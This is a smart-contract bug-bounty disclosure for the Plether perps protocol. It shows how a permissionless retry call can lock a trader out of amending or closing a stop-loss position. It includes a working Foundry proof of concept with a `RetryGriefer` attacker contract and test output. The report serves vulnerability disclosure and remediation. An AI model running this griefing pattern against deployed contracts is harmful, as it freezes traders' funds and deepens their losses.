# \#97814 [SC-High] Permissionless protection retry blocks the owner's latched close-limit amendment and locks the trader in the position

**Submitted on Nov 3rd 2026 at 11:27:34 UTC by @emilh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97814
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description

**Severity:** Medium (Griefing; Temporary freezing of funds for at least 1 hour)
**Asset:** `packages/perps/src/PositionProtectionBook.sol` @ `a82d4fefb02768e5b3bddcc97dee371eee24fea8`

## Summary

#124 fixed MED-9 by storing the trader's close ceilings on each protection and copying them into every triggered or retried close. When a ceiling binds, that close fails and the protection relatches. For this case your own MED-9 comment names the way out: "Tight limits may prevent execution until conditions improve or the owner amends them."

That amendment only works while the protection is `Latched` with an empty account queue. `retryPositionProtectionClose` is open to anyone and puts the protection straight back into `Triggered`. An attacker who ends the live attempt (executing it while it fails, or expiring it after 60 s) and retries in the same transaction leaves the owner no transaction boundary at which `Latched` is visible. Every other exit is closed too, so the position stays frozen while the attacker repeats one cheap call.

## Root cause

- Amendment requires `Latched` plus an empty queue: [PositionProtectionBook.sol#L315-L327](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L327).
- Retry has no caller check and no owner window. It records a new attempt and sets `Triggered`: [L382-L406](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406).
- A failed or expired attempt relatches inside the very call that ends it: [L663-L667](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L663-L667).
- Other exits are shut: `cancelPositionProtection` takes only `PendingOpen`/`Armed` ([L413-L418](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L413-L418)), `cancelPositionProtectionAndCommitClose` takes only `Armed` ([L346](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L346)), and public commits revert `ProtectionActive` ([OrderLiquidationBatchLogic.sol#L313-L315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315)).

In short, the owner can only act from a state that any caller can skip.

## Attack path

1. Alice's stop-loss fires on a gap. Her realized loss exceeds `maxGrossAccountDebitAssets`, so the close fails with `ConstraintViolation`.
2. An attacker contract calls `executeOrder(liveAttempt, data)` and then `retryPositionProtectionClose(id)` in one call. After the deadline, the first call expires the attempt with no oracle data at all.
3. This repeats for every new attempt. Alice's amend, cancel, atomic exit and `commitOrder(close)` all revert.

No funds or role are needed; attempts pay a zero bounty, so gas is the whole cost. Keepers hold no special privileges per the scope page.

## Impact

Alice's position margin and PnL stay frozen while the attacker keeps cycling, with no bound in the code. Worse, the freeze lasts exactly while her loss exceeds the ceiling. She is held in a losing position, possibly until liquidation, which is the situation the MED-9 amendment exists for. In my PoC one hour of griefing, with the price drifting 1.12 -> 1.16, cost Alice an extra 400.16 USDG on a 10,000 USDG position.

## What limits the impact

- It needs a binding ceiling. With unlimited limits the close fills and there is nothing to grief. A trader may choose a tight ceiling, and gross debit also grows with carry, but the ceiling is not the bug. Denying its remedy is.
- If an honest keeper executes a failing attempt in its own transaction, Alice gets a short `Latched` window that the attacker has to race. In my PoC the attacker always ends the attempt itself.
- The freeze ends once an attempt can fill within the old ceiling and a keeper executes it.
- The 400.16 USDG figure comes from the price path I chose. The freeze itself does not depend on it.

I am filing this as Medium for griefing and a freeze of at least one hour.

## Known issues

- **MED-9:** a new bug in its fix. The amendment did not exist at the audited commit `6d6622f2`.
- **MED-30:** covers the frozen-market `Armed` exit and leaves amendment as the only lever for `Latched`. Here that lever is denied.
- **Scan S-10:** covers trigger-bounty incentives on pre-amendment code (`d4541b49`), with no retry loop.

## Recommendation

Any one of these closes the gap:

- Let the owner amend while `Triggered`, with the new limits applying to the next attempt.
- Give the owner an exclusive retry window after relatch.
- Allow `cancelPositionProtectionAndCommitClose` from `Latched`.

I checked the first option against the PoC: with it applied, both PoC tests fail and the control still passes.

## Proof of Concept

## Proof of Concept

I extended the repo's `PositionProtectionTest` in `packages/perps/test/perps/spec/trader/ProtectionAmendRetryGrief.t.sol` (attached).

```bash
FOUNDRY_PROFILE=quick forge test --root packages/perps --match-path 'test/perps/spec/trader/ProtectionAmendRetryGrief.t.sol' --match-test 'test_PoC_|test_Control_' -vv
```

- `test_Control_...` (positive control): a keeper fails the attempt in its own transaction, Alice amends, the retry closes her position.
- `test_PoC_PermissionlessRetryBlocksOwnerAmendmentIndefinitely` runs 1 execute-fail-retry and 61 expire-retry cycles, asserting after each that all four of Alice's exits revert, then that over an hour passed, the position is open and the attacker's balance is unchanged.
- `test_PoC_StopLossGapHeldWhileLossGrows` uses `vm.snapshotState`: the control exits at the 1.12 gap, the griefed run at 1.16 after the attacker stops.

```
[PASS] test_Control_OwnerAmendmentClosesPositionWithoutGriefer() (gas: 3954284)
[PASS] test_PoC_PermissionlessRetryBlocksOwnerAmendmentIndefinitely() (gas: 54364889)
[PASS] test_PoC_StopLossGapHeldWhileLossGrows() (gas: 60875335)
  Alice balance, owner amends at gap (USDG): 18791.320000
  Alice balance, griefed for 1h (USDG)   : 18391.159620
  extra loss caused by the griefer (USDG) : 400.160380
```

Full test file (save as `packages/perps/test/perps/spec/trader/ProtectionAmendRetryGrief.t.sol`):

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @notice Unprivileged, unfunded contract. In ONE transaction it terminalizes the live protection attempt
///         (execution failure on the trader's ceiling, or oracle-free expiry) and immediately appends a retry.
///         The protection therefore never sits in `Latched` with an empty queue at a transaction boundary.
contract RetryGriefer {

    IPerpsKeeper internal immutable KEEPER;
    IPositionProtectionActions internal immutable BOOK;

    constructor(
        address router,
        address book
    ) {
        KEEPER = IPerpsKeeper(router);
        BOOK = IPositionProtectionActions(book);
    }

    function cycle(
        uint64 liveAttempt,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external returns (uint64 nextAttempt) {
        OrderV3Types.ExecutionResult memory result = KEEPER.executeOrder(liveAttempt, pythUpdateData);
        require(result.status == OrderV3Types.LifecycleStatus.Failed, "attempt not terminal");
        nextAttempt = BOOK.retryPositionProtectionClose(protectionId);
    }

}

contract ProtectionAmendRetryGriefTest is PositionProtectionTest {

    address internal constant ATTACKER = address(0xBAD);
    uint256 internal constant GRIEF_ROUNDS = 61;

    /// @notice Control: with no griefer, the MED-9 remedy works. A keeper fails the bounded attempt in its own
    ///         transaction, Alice amends the latched ceilings, and the amended retry closes her position.
    function test_Control_OwnerAmendmentClosesPositionWithoutGriefer() public {
        (uint64 protectionId, uint64 attempt) = _armAndTriggerWithBindingCeiling();

        bytes[] memory executionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(attempt, executionData);
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _relaxedLimits());

        vm.prank(CAROL);
        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        executionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        result = router.executeOrder(retryOrderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "control: owner remedy closes the position");
    }

    /// @notice PoC: a permissionless caller keeps the protection out of `Latched` at every transaction boundary,
    ///         so the owner can never amend, cancel, or manually close. 61 rounds = more than one hour.
    function test_PoC_PermissionlessRetryBlocksOwnerAmendmentIndefinitely() public {
        (uint64 protectionId, uint64 attempt) = _armAndTriggerWithBindingCeiling();
        RetryGriefer griefer = new RetryGriefer(address(router), address(protectionBook));
        uint256 attackerBalanceBefore = clearinghouse.balanceAssets(ATTACKER);
        uint256 start = vm.getBlockTimestamp();

        // Round 1: the live attempt executes, fails on Alice's ceiling, and is re-queued in the same tx.
        bytes[] memory executionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(ATTACKER);
        attempt = griefer.cycle(attempt, protectionId, executionData);
        _assertOwnerLockedOut(protectionId);

        // Rounds 2..N: oracle-free expiry at the 60s deadline, re-queued in the same tx.
        for (uint256 i; i < GRIEF_ROUNDS; ++i) {
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            vm.prank(ATTACKER);
            attempt = griefer.cycle(attempt, protectionId, new bytes[](0));
            _assertOwnerLockedOut(protectionId);
        }

        assertGt(vm.getBlockTimestamp() - start, 1 hours, "owner locked out for more than one hour");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "position can be neither closed nor amended");
        assertEq(clearinghouse.balanceAssets(ATTACKER), attackerBalanceBefore, "attacker needs no funds or role");
    }

    uint256 internal constant SL_GAP_PRICE = 112_000_000;
    uint256 internal constant SL_DRIFT_PRICE = 116_000_000;
    uint256 internal constant SL_DEBIT_CEILING = 1050e6;

    /// @notice Stop-loss gap: the realized loss exceeds Alice's gross-debit ceiling, so she wants to amend and exit.
    ///         Control exits at the gap price. With the griefer active she is held while the price drifts further,
    ///         and exits only after the attacker stops. The balance difference is damage caused by the attacker.
    function test_PoC_StopLossGapHeldWhileLossGrows() public {
        uint256 snapshot = vm.snapshotState();
        uint256 controlBalance = _stopLossScenario(false);
        vm.revertToState(snapshot);
        uint256 griefedBalance = _stopLossScenario(true);

        emit log_named_decimal_uint("Alice balance, owner amends at gap (USDG)", controlBalance, 6);
        emit log_named_decimal_uint("Alice balance, griefed for 1h (USDG)   ", griefedBalance, 6);
        emit log_named_decimal_uint("extra loss caused by the griefer (USDG) ", controlBalance - griefedBalance, 6);
        assertGt(controlBalance - griefedBalance, 300e6, "griefer holds Alice in the losing position");
    }

    function _stopLossScenario(
        bool grief
    ) internal returns (uint256 finalBalance) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        params.closeLimits.maxGrossAccountDebitAssets = SL_DEBIT_CEILING;
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 attempt = _triggerAt(protectionId, SL_GAP_PRICE);

        if (grief) {
            RetryGriefer griefer = new RetryGriefer(address(router), address(protectionBook));
            bytes[] memory gapData = _mockPythUpdateData(SL_GAP_PRICE);
            vm.prank(ATTACKER);
            attempt = griefer.cycle(attempt, protectionId, gapData);
            _assertOwnerLockedOut(protectionId);
            for (uint256 i; i < GRIEF_ROUNDS; ++i) {
                uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
                vm.warp(uint256(deadline) + 1);
                vm.roll(vm.getBlockNumber() + 1);
                vm.prank(ATTACKER);
                attempt = griefer.cycle(attempt, protectionId, new bytes[](0));
                _assertOwnerLockedOut(protectionId);
            }
            bytes[] memory driftData = _mockPythUpdateData(SL_DRIFT_PRICE);
            vm.prank(ATTACKER);
            attempt = griefer.cycle(attempt, protectionId, driftData);
            _assertOwnerLockedOut(protectionId);

            // The attacker stops. Alice expires the live attempt herself, then finally gets her amendment window.
            uint64 lastDeadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(uint256(lastDeadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            vm.prank(ALICE);
            router.executeOrder(attempt, new bytes[](0));
        } else {
            bytes[] memory gapData = _mockPythUpdateData(SL_GAP_PRICE);
            vm.prank(EXECUTION_KEEPER);
            OrderV3Types.ExecutionResult memory failed = router.executeOrder(attempt, gapData);
            assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        }

        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _relaxedLimits());
        vm.prank(ALICE);
        uint64 exitAttempt = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory exitData = _mockPythUpdateData(grief ? SL_DRIFT_PRICE : SL_GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory exited = router.executeOrder(exitAttempt, exitData);
        assertEq(uint8(exited.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended exit executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0);
        finalBalance = clearinghouse.balanceAssets(ALICE);
    }

    function _armAndTriggerWithBindingCeiling() internal returns (uint64 protectionId, uint64 attempt) {
        _startRecordingLogs();
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20 - 1;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
        attempt = _triggerAt(protectionId, LONG_TAKE_PROFIT);
    }

    function _assertOwnerLockedOut(
        uint64 protectionId
    ) internal {
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "a live attempt always exists between transactions"
        );
        assertEq(router.pendingOrderCounts(ALICE), 1);

        PositionProtectionTypes.CloseFinancialLimits memory relaxed = _relaxedLimits();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, relaxed);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory exit = _publicBoundedRequest(keccak256("alice-exit"), true);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, exit);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(exit);
    }

    function _relaxedLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

}
```
